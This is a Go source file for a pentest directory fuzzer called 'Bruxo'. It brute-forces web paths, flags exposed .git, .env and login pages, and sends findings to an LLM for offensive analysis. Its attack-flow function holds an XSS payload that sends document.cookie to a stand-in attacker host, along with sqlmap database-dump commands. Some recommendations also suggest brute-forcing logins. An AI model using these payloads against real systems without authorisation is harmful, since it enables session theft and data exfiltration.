package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/valyala/fasthttp"
	"golang.org/x/time/rate"
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorCyan   = "\033[36m"
	ColorPurple = "\033[35m"
	ColorWhite  = "\033[37m"
	Bold        = "\033[1m"
)



type BruxoEngine struct {
	config         *Config
	results        []ScanResult
	progress       Progress
	visited        sync.Map
	mu             sync.Mutex
	logger         *Logger
	rateLimiter    *rate.Limiter
	ctx            context.Context
	cancel         context.CancelFunc
	workQueue      chan string
	resultsChan    chan ScanResult
	wg             sync.WaitGroup
	workerWg       sync.WaitGroup
	httpClient     *fasthttp.Client
	baseStatusCode int    // Armazena apenas o status code, não o objeto de resposta
	baseHash       uint32 // Hash do conteúdo base para comparação rápida
	chatAnalysis   string
}

// ScanResult agora pode representar um resultado parcial ou final
// Omitimos campos que não são preenchidos na primeira fase

// bruxo.go

type Config struct {
	TargetURL         string
	WordlistPath      string
	NumThreads        int
	OutputFile        string
	Format            string
	ShowStatusCodes   []int
	FilterStatusCodes []int
	FilterExtensions  []string
	Extensions        []string
	RateLimit         int
	Verbose           bool
	Debug             bool
	Timeout           int
	FindHidden        bool
	GroqAPIKey        string
	EnableAttackFlow  bool
	RedTeamToolURL    string
}

type AttackStep struct {
	Stage   string `json:"Stage"`
	Command string `json:"Command"`
}

type AttackFlow []AttackStep

type Vulnerability struct {
	Name           string `json:"Name"`
	// Severity can be Critical, High, Medium, Low, Informational
	Severity       string `json:"Severity"`
	Description    string `json:"Description"`
	Recommendation string `json:"Recommendation"`
	AttackFlow     AttackFlow `json:"AttackFlow,omitempty"`
}

type ScanResult struct {
	URL             string          `json:"URL"`
	StatusCode      int             `json:"StatusCode"`
	ContentLength   int             `json:"ContentLength"`
	ResponseTime    time.Duration   `json:"ResponseTime"`
	ContentType     string            `json:"ContentType"`
	Headers         map[string]string `json:"Headers"`
	Title           string            `json:"Title"`
	Category        string          `json:"Category"`
	IsHidden        bool            `json:"IsHidden"`
	Error           string          `json:"Error"`
	AIAnalysis      string          `json:"AIAnalysis,omitempty"`
	Vulnerabilities []Vulnerability `json:"Vulnerabilities,omitempty"`
}

// Estruturas para a API da OpenAI
type OpenAIRequest struct {
	Model    string          `json:"model"`
	Messages []OpenAIMessage `json:"messages"`
}

type OpenAIMessage struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type OpenAIResponse struct {
	Choices []struct {
		Message OpenAIMessage `json:"message"`
	} `json:"choices"`
	Error *struct {
		Message string `json:"message"`
	} `json:"error"`
}

type Progress struct {
	startTime  time.Time
	totalPaths int64
	completed  int64
	found      int64
	hidden     int64
}

type Logger struct {
	verbose bool
	debug   bool
	mu      sync.Mutex
}

func (l *Logger) Info(format string, args ...interface{}) {
	l.mu.Lock()
	defer l.mu.Unlock()
	fmt.Printf(ColorCyan+"[INFO] "+ColorReset+format+"\n", args...)
}

func (l *Logger) Debug(format string, args ...interface{}) {
	if l.debug {
		l.mu.Lock()
		defer l.mu.Unlock()
		fmt.Printf(ColorYellow+"[DEBUG] "+ColorReset+format+"\n", args...)
	}
}

func (l *Logger) Error(format string, args ...interface{}) {
	l.mu.Lock()
	defer l.mu.Unlock()
	fmt.Fprintf(os.Stderr, ColorRed+"[ERROR] "+ColorReset+format+"\n", args...)
}

// Função simples de hash para comparação rápida
func simpleHash(data []byte) uint32 {
	var h uint32 = 2166136261
	for _, b := range data {
		h ^= uint32(b)
		h *= 16777619
	}
	return h
}

func NewBruxoEngine(config *Config) *BruxoEngine {
	ctx, cancel := context.WithCancel(context.Background())
	engine := &BruxoEngine{
		config:      config,
		results:     []ScanResult{},
		logger:      &Logger{verbose: config.Verbose, debug: config.Debug},
		rateLimiter: rate.NewLimiter(rate.Limit(config.RateLimit), config.RateLimit/10+1),
		ctx:         ctx,
		cancel:      cancel,
		httpClient: &fasthttp.Client{
			TLSConfig:           &tls.Config{InsecureSkipVerify: true},
			MaxConnsPerHost:     config.NumThreads,
			ReadTimeout:         time.Duration(config.Timeout) * time.Second,
			WriteTimeout:        time.Duration(config.Timeout) * time.Second,
			MaxIdleConnDuration: 90 * time.Second,
		},
	}

	if config.FindHidden {
		engine.getBaseResponse()
	}

	return engine
}

func (b *BruxoEngine) getBaseResponse() {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(b.config.TargetURL)
	req.Header.SetMethod("GET")
	req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	err := b.httpClient.Do(req, resp)
	if err != nil {
		return
	}

	b.baseStatusCode = resp.StatusCode()
	b.baseHash = simpleHash(resp.Body())
	b.logger.Debug("Hash base: %d, Status base: %d", b.baseHash, b.baseStatusCode)
}

func (b *BruxoEngine) setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Printf("\n\n%sRecebido sinal de interrupção. Finalizando...%s\n", ColorRed, ColorReset)
		b.cancel()
		b.workerWg.Wait()
		b.wg.Wait()
		os.Exit(1)
	}()
}

func (b *BruxoEngine) Scan() error {
	b.setupSignalHandler()
	b.progress.startTime = time.Now()
	b.workQueue = make(chan string, b.config.NumThreads)
	b.resultsChan = make(chan ScanResult, b.config.NumThreads)

	totalLines, err := countLines(b.config.WordlistPath)
	if err != nil {
		b.logger.Error("Could not count lines: %v", err)
	} else {
		atomic.StoreInt64(&b.progress.totalPaths, totalLines)
	}

	for i := 0; i < b.config.NumThreads; i++ {
		b.workerWg.Add(1)
		go b.worker()
	}

	// Inicia o coletor de resultados e a barra de progresso
	b.wg.Add(1)
	go b.collectResults()
	b.wg.Add(1)
	go b.printProgressPeriodically()

	// Adiciona uma verificação inicial na própria URL base
	b.logger.Info("Performing initial check on the base target URL...")
	initialResult := b.scanURL(b.config.TargetURL)
	if initialResult.Error == "" && (b.shouldShowResult(initialResult.StatusCode) || initialResult.IsHidden) {
		atomic.AddInt64(&b.progress.found, 1)
		b.mu.Lock()
		b.analyzeVulnerabilities(&initialResult)
		b.results = append(b.results, initialResult)
		b.mu.Unlock()
	}

	go func() {
		defer close(b.workQueue)

		file, err := os.Open(b.config.WordlistPath)
		if err != nil {
			return
		}
		defer file.Close()

		baseURL, _ := url.Parse(b.config.TargetURL)
		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			select {
			case <-b.ctx.Done():
				return
			default:
				path := strings.TrimSpace(scanner.Text())
				if path == "" || b.isPathFiltered(path) {
					continue
				}

				if len(b.config.Extensions) > 0 {
					for _, ext := range b.config.Extensions {
						fullURL := *baseURL
						fullURL.Path = strings.TrimSuffix(baseURL.Path, "/") + "/" + strings.TrimPrefix(path+ext, "/")
						urlStr := fullURL.String()
						if _, loaded := b.visited.LoadOrStore(urlStr, true); !loaded {
							b.workQueue <- urlStr
						}
					}
				} else {
					fullURL := *baseURL
					fullURL.Path = strings.TrimSuffix(baseURL.Path, "/") + "/" + strings.TrimPrefix(path, "/")
					urlStr := fullURL.String()
					if _, loaded := b.visited.LoadOrStore(urlStr, true); !loaded {
						b.workQueue <- urlStr
					}
				}
			}
		}
	}()

	// Espera todos os workers terminarem
	b.workerWg.Wait()
	// Agora que os workers terminaram, podemos fechar o canal de resultados
	close(b.resultsChan)

	// Sinaliza para a goroutine de progresso parar
	b.cancel()

	// Espera as goroutines de coleta e progresso terminarem
	b.wg.Wait()

	// Realiza a análise com IA se a chave estiver disponível
	if b.config.GroqAPIKey != "" {
		fmt.Printf("\n%s\n", strings.Repeat("-", 60))
		b.logger.Info("Starting AI analysis (Groq) for each result...")
		b.showSpinner(b.ctx, "Analisando com IA")
		b.performBulkAIAnalysis()
		b.logger.Info("AI analysis complete.")
	}

	if b.config.EnableAttackFlow {
		for i := range b.results {
			result := &b.results[i]
			for j := range result.Vulnerabilities {
				vuln := &result.Vulnerabilities[j]
				vuln.AttackFlow = b.generateAttackFlow(vuln.Name, result.URL)
			}
		}
	}

	if b.config.RedTeamToolURL != "" {
		for i := range b.results {
			b.integrateWithRedTeamTool(&b.results[i])
		}
	}

	fmt.Println()
	b.printSummaryTable()

	if b.config.OutputFile != "" {
		if err := b.generateReport(); err != nil {
			b.logger.Error("Error generating report: %v", err)
		}
	}

	return nil
}

func (b *BruxoEngine) worker() {
	defer b.workerWg.Done()
	for urlStr := range b.workQueue {
		if b.ctx.Err() != nil {
			return
		}
		b.rateLimiter.Wait(b.ctx)
		result := b.scanURL(urlStr)
		b.resultsChan <- result
	}
}

func (b *BruxoEngine) scanURL(urlStr string) ScanResult {
	start := time.Now()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(urlStr)
	req.Header.SetMethod("GET")
	req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	err := b.httpClient.Do(req, resp)
	if err != nil {
		return ScanResult{URL: urlStr, Error: err.Error()}
	}

	atomic.AddInt64(&b.progress.completed, 1)

	statusCode := resp.StatusCode()
	var title string
	var isHidden bool

	body := resp.Body()

	if b.config.FindHidden && b.baseStatusCode != 0 {
		currentHash := simpleHash(body)
		if currentHash != b.baseHash && statusCode == b.baseStatusCode {
			isHidden = true
		}
	}

	headers := make(map[string]string)
	resp.Header.VisitAll(func(key, value []byte) {
		headers[string(key)] = string(value)
	})

	if b.shouldShowResult(statusCode) || isHidden {
		title = extractTitle(body)
	}

	return ScanResult{
		URL:           urlStr,
		StatusCode:    statusCode,
		ContentLength: len(body),
		ResponseTime:  time.Since(start),
		ContentType:   string(resp.Header.ContentType()),
		Headers:       headers,
		Title:         title,
		Category:      b.categorizePath(urlStr),
		IsHidden:      isHidden,
	}
}

func (b *BruxoEngine) collectResults() {
	defer b.wg.Done()

	for result := range b.resultsChan {

		if result.Error == "" {
			if result.IsHidden {
				atomic.AddInt64(&b.progress.hidden, 1)
			}

			if b.shouldShowResult(result.StatusCode) || result.IsHidden {
				atomic.AddInt64(&b.progress.found, 1)
				b.mu.Lock()
				b.analyzeVulnerabilities(&result)

				b.results = append(b.results, result)
				b.mu.Unlock()
			}
		}
	}
}

func (b *BruxoEngine) shouldShowResult(statusCode int) bool {
	for _, code := range b.config.FilterStatusCodes {
		if code == statusCode {
			return false
		}
	}

	if len(b.config.ShowStatusCodes) > 0 {
		for _, code := range b.config.ShowStatusCodes {
			if code == statusCode {
				return true
			}
		}
		return false
	}

	return true
}

func (b *BruxoEngine) printProgress() {
	completed := atomic.LoadInt64(&b.progress.completed)
	total := atomic.LoadInt64(&b.progress.totalPaths)
	hidden := atomic.LoadInt64(&b.progress.hidden)
	duration := time.Since(b.progress.startTime).Seconds()

	if duration < 0.1 {
		duration = 0.1
	}

	rps := float64(completed) / duration
	percentage := float64(0)
	if total > 0 {
		percentage = (float64(completed) / float64(total)) * 100
	}

	fmt.Printf("\r%s[%.2f%%] Complete: %d/%d | Hidden: %d | RPS: %.0f%s",
		Bold, percentage, completed, total, hidden, rps, ColorReset)
}

func (b *BruxoEngine) printProgressPeriodically() {
	defer b.wg.Done()

	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			b.printProgress()
		case <-b.ctx.Done():
			b.printProgress()
			return
		}
	}
}

func (b *BruxoEngine) printSummaryTable() {
	sort.Slice(b.results, func(i, j int) bool {
		return b.results[i].StatusCode < b.results[j].StatusCode
	})

	fmt.Printf("\n\n%s--- 🔮 Scan Summary 🔮 ---%s\n", Bold, ColorReset)

	// Print the results table
	fmt.Printf("| %-8s | %-70s | %-15s | %-40s |\n", "STATUS", "URL", "SIZE", "TITLE")
	fmt.Printf("|%s|%s|%s|%s|\n", strings.Repeat("-", 10), strings.Repeat("-", 72), strings.Repeat("-", 17), strings.Repeat("-", 42))

	for _, res := range b.results {
		color := getStatusCodeColor(res.StatusCode)
		statusStr := fmt.Sprintf("%s%d%s", color, res.StatusCode, ColorReset)

		// Truncate URL and Title if they are too long to fit in the table
		urlStr := res.URL
		if len(urlStr) > 68 {
			urlStr = urlStr[:65] + "..."
		}
		titleStr := res.Title
		if len(titleStr) > 38 {
			titleStr = titleStr[:35] + "..."
		}

		fmt.Printf("| %-17s | %-70s | %-15d | %-40s |\n", statusStr, urlStr, res.ContentLength, titleStr)
	}

	// Show stats for hidden URLs
	if b.config.FindHidden {
		fmt.Printf("\n%s[HIDDEN]%s %d URLs with different content detected\n",
			ColorPurple, ColorReset, atomic.LoadInt64(&b.progress.hidden))
	}

	fmt.Printf("\n%sScan completed in %.2f seconds. Total of %d URLs found.%s\n",
		ColorWhite, time.Since(b.progress.startTime).Seconds(), len(b.results), ColorReset)
}

func (b *BruxoEngine) generateReport() error {
	switch b.config.Format {
	case "json":
		data, err := json.MarshalIndent(b.results, "", "  ")
		if err != nil {
			return err
		}
		return os.WriteFile(b.config.OutputFile, data, 0644)
	case "html":
		return b.generateHTMLReport()
	}
	return fmt.Errorf("unsupported or unspecified format: %s", b.config.Format)
}

func (b *BruxoEngine) generateHTMLReport() error {
	funcMap := template.FuncMap{
		"json": func(v interface{}) (string, error) {
			b, err := json.Marshal(v)
			return string(b), err
		},
	}

	tmpl, err := template.New("report_template.html").Funcs(funcMap).ParseFiles("report_template.html")
	if err != nil {
		return fmt.Errorf("could not load HTML template: %w", err)
	}

	file, err := os.Create(b.config.OutputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	data := struct {
		Results      []ScanResult
		TargetURL    string
		GeneratedAt  string
		TotalFound   int
		ChatAnalysis string
	}{
		Results:      b.results,
		TargetURL:    b.config.TargetURL,
		GeneratedAt:  time.Now().Format(time.RFC1123),
		TotalFound:   len(b.results),
		ChatAnalysis: b.chatAnalysis,
	}

	return tmpl.Execute(file, data)
}

func (b *BruxoEngine) generateAttackFlow(vulnName, targetURL string) AttackFlow {
	switch vulnName {
	case "SQL Injection":
		return []AttackStep{
			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u "%s" --dbs --batch`, targetURL)},
			{Stage: "Exploração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> --tables --batch`, targetURL)},
			{Stage: "Exfiltração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> -T <tabela> --dump --batch`, targetURL)},
		}
	case "Cross-Site Scripting (XSS)":
		return []AttackStep{
			{Stage: "Verificação", Command: `<script>alert(document.domain)</script>`},
			{Stage: "Exploração", Command: `<script>fetch('https://sua-maquina.com/?cookie='+document.cookie)</script>`},
			{Stage: "Pivoting", Command: `document.location='https://site-interno-da-rede'`},
		}
		// Adicione mais casos para outras vulnerabilidades aqui
	}
	return nil
}

func (b *BruxoEngine) integrateWithRedTeamTool(result *ScanResult) {
	// Exemplo de integração com uma ferramenta externa como o brutex-api
	for _, vuln := range result.Vulnerabilities {
		if vuln.Name == "SQL Injection" { // Ou qualquer outra condição
			b.logger.Info("Integrating with the Red Team tool for %s in %s", vuln.Name, result.URL)

			payload := map[string]string{
				"vulnerability": vuln.Name,
				"target":      result.URL,
				"technique":   "UNION-based", // Isso pode ser mais dinâmico
			}
			jsonPayload, _ := json.Marshal(payload)

			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			defer fasthttp.ReleaseRequest(req)
			defer fasthttp.ReleaseResponse(resp)

			req.SetRequestURI(b.config.RedTeamToolURL)
			req.Header.SetMethod("POST")
			req.Header.SetContentType("application/json")
			req.SetBody(jsonPayload)

			if err := b.httpClient.Do(req, resp); err != nil {
				b.logger.Error("Error contacting the Red Team tool API: %v", err)
				continue
			}

			if resp.StatusCode() == fasthttp.StatusOK {
				b.logger.Info("Payload generated successfully by the API for %s", result.URL)
				// Você pode processar a resposta da API aqui
				b.logger.Debug("API response: %s", string(resp.Body()))
			} else {
				b.logger.Error("Failed to generate payload by the API for %s. Status: %d", result.URL, resp.StatusCode())
			}
		}
	}
}

func (b *BruxoEngine) categorizePath(path string) string {
	path = strings.ToLower(path)
	switch {
	case strings.Contains(path, "admin") || strings.Contains(path, "login"):
		return "Authentication"
	case strings.Contains(path, "api"):
		return "API"
	case strings.Contains(path, "config") || strings.Contains(path, ".env"):
		return "Configuration"
	default:
		return "General"
	}
}

func (b *BruxoEngine) analyzeVulnerabilities(result *ScanResult) {
	// Mini-scanner para repositório .git exposto
	if strings.HasSuffix(result.URL, "/.git/config") && result.StatusCode == 200 {
		vuln := Vulnerability{
			Name:           "Exposed Git Repository",
			Severity:       "Critical",
			Description:    "The .git/config file is publicly accessible. This can expose the entire source code, history, and potentially sensitive information.",
			Recommendation: "Immediately restrict access to the .git directory. Use tools like 'git-dumper' to download the source code and analyze it for secrets.",
		}
		result.Vulnerabilities = append(result.Vulnerabilities, vuln)
	}

	// Detector de Painel de Login
	loginPaths := []string{"/login", "/admin", "/user", "/wp-login.php", "/administrator/"}
	for _, p := range loginPaths {
		if strings.Contains(result.URL, p) && result.StatusCode == 200 {
			vuln := Vulnerability{
				Name:           "Potential Login Panel",
				Severity:       "Medium",
				Description:    "A potential login panel was found. This could be a target for brute-force attacks or default credential testing.",
				Recommendation: "Attempt to identify the technology and test for default credentials. Consider running a brute-force attack with a common password list.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break // Adiciona apenas uma vez por resultado
		}
	}

	// Detector de Arquivos Sensíveis
	sensitiveFiles := []string{".env", "wp-config.php", "config.json", "credentials", ".htpasswd"}
	for _, f := range sensitiveFiles {
		if strings.HasSuffix(result.URL, f) && result.StatusCode == 200 {
			vuln := Vulnerability{
				Name:           "Sensitive File Exposed",
				Severity:       "High",
				Description:    fmt.Sprintf("The file '%s' was found, which may contain sensitive information like database credentials, API keys, or other secrets.", f),
				Recommendation: "Immediately review the contents of the file and restrict access. Rotate any exposed credentials.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break
		}
	}

	// Análise de Cabeçalhos HTTP
	if len(result.Headers) > 0 {
		// Verificação de Divulgação de Tecnologia
		if serverHeader, ok := result.Headers["Server"]; ok {
			vuln := Vulnerability{
				Name:           "Technology Disclosure (Server Header)",
				Severity:       "Informational",
				Description:    fmt.Sprintf("The Server header revealed the following technology: %s. This information can help an attacker find known vulnerabilities.", serverHeader),
				Recommendation: "Consider removing or obfuscating the Server header to avoid revealing specific software versions.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}

		// Verificação de Cabeçalhos de Segurança Ausentes
		missingHeaders := []string{}
		securityHeaders := []string{"Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"}
		for _, h := range securityHeaders {
			if _, ok := result.Headers[h]; !ok {
				missingHeaders = append(missingHeaders, h)
			}
		}

		if len(missingHeaders) > 0 {
			vuln := Vulnerability{
				Name:           "Missing Security Headers",
				Severity:       "Low",
				Description:    fmt.Sprintf("The following security headers are missing: %s. Their absence can expose the application to attacks like clickjacking and cross-site scripting (XSS).", strings.Join(missingHeaders, ", ")),
				Recommendation: "Implement the missing security headers according to security best practices to harden the application.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}

	// Futuros mini-scanners podem ser adicionados aqui
}

func getStatusCodeColor(statusCode int) string {
	switch {
	case statusCode >= 200 && statusCode < 300:
		return ColorGreen
	case statusCode >= 300 && statusCode < 400:
		return ColorBlue
	case statusCode >= 400 && statusCode < 500:
		return ColorYellow
	case statusCode >= 500:
		return ColorRed
	default:
		return ColorReset
	}
}

func countLines(filePath string) (int64, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	buf := make([]byte, 64*1024)
	count := int64(0)
	lineSep := []byte{'\n'}

	for {
		c, err := file.Read(buf)
		count += int64(bytes.Count(buf[:c], lineSep))
		if err == io.EOF {
			break
		}
		if err != nil {
			return 0, err
		}
	}
	return count, nil
}

var titleRegex = regexp.MustCompile(`(?i)<title>(.*?)</title>`)

func extractTitle(body []byte) string {
	matches := titleRegex.FindSubmatch(body)
	if len(matches) > 1 {
		return strings.TrimSpace(string(matches[1]))
	}
	return ""
}

func (b *BruxoEngine) performBulkAIAnalysis() {
	var wg sync.WaitGroup
	limiter := make(chan struct{}, 5) // Limita a 5 análises concorrentes para não sobrecarregar a API

	for i := range b.results {
		wg.Add(1)
		limiter <- struct{}{}
		go func(idx int) {
			defer wg.Done()
			defer func() { <-limiter }()

			result := &b.results[idx]
			analysis, err := b.getAIAnalysisForURL(result)
			if err != nil {
				b.logger.Error("Falha na análise para %s: %v", result.URL, err)
				result.AIAnalysis = "Falha ao gerar análise para esta URL."
			} else {
				result.AIAnalysis = analysis
			}
		}(i)
	}
	wg.Wait()
}

func (b *BruxoEngine) getAIAnalysisForURL(result *ScanResult) (string, error) {
	// 1. Formatar o resultado em JSON para o prompt
	resultJSON, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return "", fmt.Errorf("error formatting result: %w", err)
	}

	// 2. Criar o prompt para a IA
	prompt := fmt.Sprintf(`As an offensive security expert, analyze the following result from a directory scan.

Scan Result (JSON):
%s

Your task is:
1.  **Risk Summary:** In one sentence, what is the potential risk of this finding? (e.g., 'Exposure of a sensitive configuration file' or 'Default application page revealing technology').
2.  **Technical Analysis:** Explain what this finding means in a pentest context.
3.  **Recommendations / Next Steps:** Suggest 1 or 2 concrete actions a pentester should take next. Be specific.
4.  **OWASP Classification (if applicable):** If the finding relates to an OWASP Top 10 2021 category, mention it (e.g., 'A01:2021-Broken Access Control').

Use Markdown to format your response clearly and concisely.
`, string(resultJSON))

	// 3. Montar a requisição para a API da Groq
	requestBody, _ := json.Marshal(OpenAIRequest{
		Model: "llama-3.1-8b-instant",
		Messages: []OpenAIMessage{
			{Role: "system", Content: "You are a concise and direct pentest assistant."},
			{Role: "user", Content: prompt},
		},
	})

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI("https://api.groq.com/openai/v1/chat/completions")
	req.Header.SetMethod(fasthttp.MethodPost)
	req.Header.SetContentType("application/json")
	req.Header.Set("Authorization", "Bearer "+b.config.GroqAPIKey)
	req.SetBody(requestBody)

	// 4. Fazer a chamada e processar a resposta
	if err := fasthttp.DoTimeout(req, resp, 90*time.Second); err != nil {
		return "", err
	}

	var openAIResp OpenAIResponse
	if err := json.Unmarshal(resp.Body(), &openAIResp); err != nil {
		return "", err
	}

	if openAIResp.Error != nil {
		return "", fmt.Errorf("Groq API error: %s", openAIResp.Error.Message)
	}

	if len(openAIResp.Choices) > 0 {
		return openAIResp.Choices[0].Message.Content, nil
	}

	return "", fmt.Errorf("the AI did not return an analysis")
}

func (b *BruxoEngine) isPathFiltered(path string) bool {
	lowerPath := strings.ToLower(path)
	for _, ext := range b.config.FilterExtensions {
		if strings.Contains(lowerPath, ext) {
			return true
		}
	}
	return false
}

func (b *BruxoEngine) showSpinner(ctx context.Context, message string) {
	go func() {
		spinner := []string{"🔮", "✨", "📜", "🪄"}
		i := 0
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%s... %sDone!%s\n", message, ColorGreen, ColorReset)
				return
			case <-ticker.C:
				fmt.Printf("\r%s... %s ", message, spinner[i])
				i = (i + 1) % len(spinner)
			}
		}
	}()
}

func main() {
	config := Config{}
	flag.StringVar(&config.TargetURL, "u", "", "Target URL for the scan (required)")
	flag.StringVar(&config.WordlistPath, "w", "", "Path to the wordlist (required)")
	flag.IntVar(&config.NumThreads, "t", 200, "Number of concurrent threads")
	flag.StringVar(&config.OutputFile, "o", "", "Output file for the report")
	showCodes := flag.String("sc", "200,204,301,302,307,403,500", "Status codes to show, comma-separated")
	filterCodes := flag.String("fc", "404", "Status codes to filter, comma-separated")
	filterExts := flag.String("fx", "css,js,png,jpg,jpeg,svg,ico,woff,woff2,eot,ttf", "Extensions or keywords to ignore, comma-separated")
	extensions := flag.String("x", "", "Extensions to add to each wordlist entry (e.g., .php,.html)")
	flag.IntVar(&config.RateLimit, "rl", 1000, "Requests per second limit")
	flag.BoolVar(&config.Verbose, "v", false, "Verbose mode")
	flag.BoolVar(&config.Debug, "debug", false, "Debug mode")
	flag.IntVar(&config.Timeout, "timeout", 10, "Request timeout in seconds")
	flag.BoolVar(&config.FindHidden, "hidden", false, "Find hidden paths by comparing response with a non-existent path")
	flag.StringVar(&config.GroqAPIKey, "groq-api-key", os.Getenv("GROQ_API_KEY"), "Groq API Key for AI analysis")
	flag.BoolVar(&config.EnableAttackFlow, "attack-flow", false, "Enable guided attack flows for found vulnerabilities")
	flag.StringVar(&config.RedTeamToolURL, "red-team-tool-url", "", "URL of the Red Team tool API for integration")

	// Lê a chave da API da variável de ambiente
	if config.GroqAPIKey == "" {
		fmt.Println(ColorYellow + "[WARNING] GROQ_API_KEY environment variable not set. AI analysis will be skipped." + ColorReset)
	}

	flag.Parse()

	if config.TargetURL == "" || config.WordlistPath == "" {
		fmt.Println(ColorRed + "Error: The -u (URL) and -w (wordlist) parameters are required." + ColorReset)
		flag.Usage()
		return
	}

	if *showCodes != "" {
		for _, codeStr := range strings.Split(*showCodes, ",") {
			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
				config.ShowStatusCodes = append(config.ShowStatusCodes, code)
			}
		}
	}

	if *filterCodes != "" {
		for _, codeStr := range strings.Split(*filterCodes, ",") {
			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
				config.FilterStatusCodes = append(config.FilterStatusCodes, code)
			}
		}
	}

	if *filterExts != "" {
		config.FilterExtensions = strings.Split(*filterExts, ",")
	}

	if *extensions != "" {
		config.Extensions = strings.Split(*extensions, ",")
	}

	if config.OutputFile != "" {
		if strings.HasSuffix(config.OutputFile, ".json") {
			config.Format = "json"
		} else if strings.HasSuffix(config.OutputFile, ".html") {
			config.Format = "html"
		} else {
			// If the extension is not recognized, default to json
			config.Format = "json"
		}
	}

	printBanner(config)

	fmt.Printf("%sStarting scan on %s with %d threads...%s\n",
		ColorGreen, config.TargetURL, config.NumThreads, ColorReset)

	fmt.Println()

	engine := NewBruxoEngine(&config)
	if err := engine.Scan(); err != nil {
		engine.logger.Error("Error during scan: %v", err)
	}
}

// bruxo.go

func printBanner(config Config) {
	banner := `
██████╗░██████╗░██╗░░░██╗██╗░░██╗░█████╗░
██╔══██╗██╔══██╗██║░░░██║╚██╗██╔╝██╔══██╗
██████╦╝██████╔╝██║░░░██║░╚███╔╝░██║░░██║
██╔══██╗██╔══██╗██║░░░██║░██╔██╗░██║░░██║
██████╦╝██║░░██║╚██████╔╝██╔╝╚██╗╚█████╔╝
╚═════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░╚════╝░
`
	tagline := "       Speed is magic — by Dione, Brazil "
	version := "          BRUXO FUZZING v1.0"

	fmt.Println(Bold + ColorPurple + banner + ColorReset)
	fmt.Println(ColorWhite + tagline + ColorReset)
	fmt.Println(ColorCyan + version + ColorReset)
	fmt.Println()

	// Configuration Panel
	fmt.Printf(" %s Target          : %s%s\n", ColorRed+"🚩"+ColorReset, ColorWhite, config.TargetURL)
	fmt.Printf(" %s Wordlist        : %s%s\n", ColorBlue+"📂"+ColorReset, ColorWhite, config.WordlistPath)
	fmt.Printf(" %s Threads         : %s%d\n", ColorYellow+"💀"+ColorReset, ColorWhite, config.NumThreads)
	fmt.Printf(" %s  Rate Limit      : %s%d/s\n", ColorGreen+"⏱️"+ColorReset, ColorWhite, config.RateLimit)
	fmt.Printf(" %s Filter (-fx)    : %s%v\n", ColorCyan+"👾"+ColorReset, ColorWhite, config.FilterExtensions)
	if len(config.Extensions) > 0 {
		fmt.Printf(" %s Extensions (-x) : %s%v\n", ColorYellow+"🧩"+ColorReset, ColorWhite, config.Extensions)
	}
	fmt.Println(strings.Repeat("-", 60))
}
